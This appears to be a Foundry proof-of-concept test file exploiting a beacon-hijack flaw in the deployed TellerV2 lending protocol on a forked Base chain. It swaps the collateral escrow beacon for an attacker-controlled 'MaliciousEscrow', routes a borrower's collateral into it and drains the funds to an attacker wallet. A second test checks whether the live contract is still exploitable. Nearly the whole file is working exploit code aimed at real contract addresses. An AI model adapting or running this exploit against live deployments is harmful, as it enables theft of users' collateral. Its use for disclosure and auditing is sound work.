// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

enum CollateralType { ERC20, ERC721, ERC1155 }

struct Collateral {
    CollateralType _collateralType;
    uint256 _amount;
    uint256 _tokenId;
    address _collateralAddress;
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ICollateralManager {
    function setCollateralEscrowBeacon(address _beacon) external;
    function getEscrow(uint256 _bidId) external view returns (address);
}

interface IMarketRegistry {
    function isVerifiedBorrower(uint256, address) external view returns (bool, string memory);
    function isMarketOpen(uint256) external view returns (bool);
    function isVerifiedLender(uint256, address) external view returns (bool, string memory);
    function isMarketClosed(uint256) external view returns (bool);
    function getPaymentCycle(uint256) external view returns (uint32, uint8);
    function getPaymentDefaultDuration(uint256) external view returns (uint32);
    function getBidExpirationTime(uint256) external view returns (uint32);
    function getPaymentType(uint256) external view returns (uint8);
    function getMarketplaceFee(uint256) external view returns (uint16);
    function getMarketFeeRecipient(uint256) external view returns (address);
}

interface IProtocolPausingManager {
    function protocolPaused() external view returns (bool);
}

interface ITellerV2 {
    function collateralManager() external view returns (address);
    function marketRegistry() external view returns (address);
    function getProtocolPausingManager() external view returns (address);
    function submitBid(
        address _lendingToken,
        uint256 _marketplaceId,
        uint256 _principal,
        uint32 _duration,
        uint16 _APR,
        string calldata _metadataURI,
        address _receiver,
        Collateral[] calldata _collateralInfo
    ) external returns (uint256);
    function lenderAcceptBid(uint256) external returns (uint256, uint256, uint256);
}

interface IBeacon {
    function implementation() external view returns (address);
}

contract UpgradeableBeacon is IBeacon {
    address private _implementation;
    address private _owner;
    constructor(address impl_, address owner_) { _implementation = impl_; _owner = owner_; }
    function implementation() external view returns (address) { return _implementation; }
    function upgradeTo(address newImpl) external {
        require(msg.sender == _owner, "not owner");
        _implementation = newImpl;
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n; symbol = s; decimals = d;
    }
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MaliciousEscrow {
    function initialize(uint256) external {}
    function depositAsset(
        CollateralType,
        address _collateralAddress,
        uint256 _amount,
        uint256
    ) external {
        IERC20(_collateralAddress).transferFrom(msg.sender, address(this), _amount);
    }
    function drain(address _token) external {
        uint256 bal = IERC20(_token).balanceOf(address(this));
        if (bal > 0) IERC20(_token).transfer(msg.sender, bal);
    }
}

contract BeaconHijackTest is Test {
    address constant TELLER_V2 = 0x5cfD3aeD08a444Be32839bD911Ebecd688861164;
    uint256 constant MARKET_ID = 1;

    // Block that the previous successful PoC ran against; reinitializer(2) is still fresh here.
    uint256 constant HISTORICAL_BLOCK = 54_726_906;

    address borrower;
    address lender;
    address attackerWallet;

    MockERC20 collateralToken;
    MockERC20 lendingToken;

    /* --------------------------------------------------------------- */
    /* PoC — fork the historical block and run the full exploit       */
    /* --------------------------------------------------------------- */

    function test_PoC_OnVulnerableBlock() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"), HISTORICAL_BLOCK);
        console.log("=== PoC fork block:", block.number, "===");

        _runExploit(true);
    }

    /* --------------------------------------------------------------- */
    /* Monitoring — fork latest and report status, never fails        */
    /* --------------------------------------------------------------- */

    function test_Status_OnLatestBlock() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
        console.log("=== Latest fork block:", block.number, "===");

        _runExploit(false);
    }

    /* --------------------------------------------------------------- */

    function _runExploit(bool mustSucceed) internal {
        borrower = makeAddr("attackerBorrower");
        lender = makeAddr("attackerLender");
        attackerWallet = makeAddr("attackerWallet");

        collateralToken = new MockERC20("Fake Collateral", "FC", 18);
        lendingToken = new MockERC20("Fake USD", "FUSD", 6);
        collateralToken.mint(borrower, 1_000 ether);
        lendingToken.mint(lender, 1_000_000e6);

        ITellerV2 teller = ITellerV2(TELLER_V2);
        ICollateralManager cm = ICollateralManager(teller.collateralManager());
        address registry = teller.marketRegistry();
        address pausingManager = teller.getProtocolPausingManager();

        console.log("TellerV2:         ", TELLER_V2);
        console.log("CollateralManager:", address(cm));
        console.log("PausingManager:   ", pausingManager);

        _mockMarketRegistry(registry);
        if (pausingManager != address(0)) {
            vm.mockCall(
                pausingManager,
                abi.encodeWithSelector(IProtocolPausingManager.protocolPaused.selector),
                abi.encode(false)
            );
        }

        // 1. Attempt beacon hijack.
        MaliciousEscrow impl = new MaliciousEscrow();
        UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this));

        bool hijacked;
        bytes memory revertReason;
        try cm.setCollateralEscrowBeacon(address(beacon)) {
            hijacked = true;
        } catch (bytes memory reason) {
            revertReason = reason;
        }

        if (!hijacked) {
            console.log("==================================================");
            console.log("BEACON HIJACK REVERTED - vulnerability is CLOSED.");
            console.log("Revert reason:");
            console.logBytes(revertReason);
            console.log("");
            console.log("This means one of:");
            console.log("  1. Protocol deployed a patched CollateralManager impl.");
            console.log("  2. Another party already consumed reinitializer(2).");
            console.log("==================================================");
            if (mustSucceed) {
                fail("PoC expected historical block to be vulnerable");
            }
            return;
        }

        console.log("Beacon hijacked -> malicious escrow impl:", address(impl));
        console.log("Beacon proxy:                          ", address(beacon));

        // 2. Borrower submits bid with fake collateral.
        Collateral[] memory collats = new Collateral[](1);
        collats[0] = Collateral({
            _collateralType: CollateralType.ERC20,
            _amount: 500 ether,
            _tokenId: 0,
            _collateralAddress: address(collateralToken)
        });

        vm.startPrank(borrower);
        collateralToken.approve(address(cm), 500 ether);
        uint256 bidId = teller.submitBid(
            address(lendingToken),
            MARKET_ID,
            1_000e6,
            30 days,
            1_000,
            "",
            borrower,
            collats
        );
        vm.stopPrank();
        console.log("Bid submitted, bidId =", bidId);

        // 3. Lender accepts. deployAndDeposit runs, collateral flows into the malicious escrow.
        vm.startPrank(lender);
        lendingToken.approve(TELLER_V2, 1_000_000e6);
        teller.lenderAcceptBid(bidId);
        vm.stopPrank();
        console.log("Lender accepted bid.");

        address escrow = cm.getEscrow(bidId);
        console.log("Escrow deployed at:", escrow);
        require(escrow != address(0), "no escrow deployed");
        require(collateralToken.balanceOf(escrow) == 500 ether, "escrow balance mismatch");

        // 4. Drain the escrow to the attacker's wallet.
        vm.prank(attackerWallet);
        MaliciousEscrow(escrow).drain(address(collateralToken));

        uint256 stolen = collateralToken.balanceOf(attackerWallet);
        console.log("Attacker wallet balance:", stolen);

        assertEq(stolen, 500 ether, "attacker did not receive collateral");
        assertEq(collateralToken.balanceOf(escrow), 0, "escrow not emptied");

        console.log("");
        console.log("=== EXPLOIT CONFIRMED ===");
        console.log("500e18 collateral drained into attacker wallet.");
    }

    /* -------------------------- mocks -------------------------- */

    function _mockMarketRegistry(address registry) internal {
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.isVerifiedBorrower.selector, MARKET_ID, borrower),
            abi.encode(true, ""));
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.isVerifiedLender.selector, MARKET_ID, lender),
            abi.encode(true, ""));
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.isMarketOpen.selector, MARKET_ID),
            abi.encode(true));
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.isMarketClosed.selector, MARKET_ID),
            abi.encode(false));
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.getPaymentCycle.selector, MARKET_ID),
            abi.encode(uint32(30 days), uint8(0)));
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.getPaymentDefaultDuration.selector, MARKET_ID),
            abi.encode(uint32(3 days)));
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.getBidExpirationTime.selector, MARKET_ID),
            abi.encode(uint32(0)));
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.getPaymentType.selector, MARKET_ID),
            abi.encode(uint8(1))); // Bullet
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.getMarketplaceFee.selector, MARKET_ID),
            abi.encode(uint16(100)));
        vm.mockCall(registry,
            abi.encodeWithSelector(IMarketRegistry.getMarketFeeRecipient.selector, MARKET_ID),
            abi.encode(address(0xFEE)));
    }
}
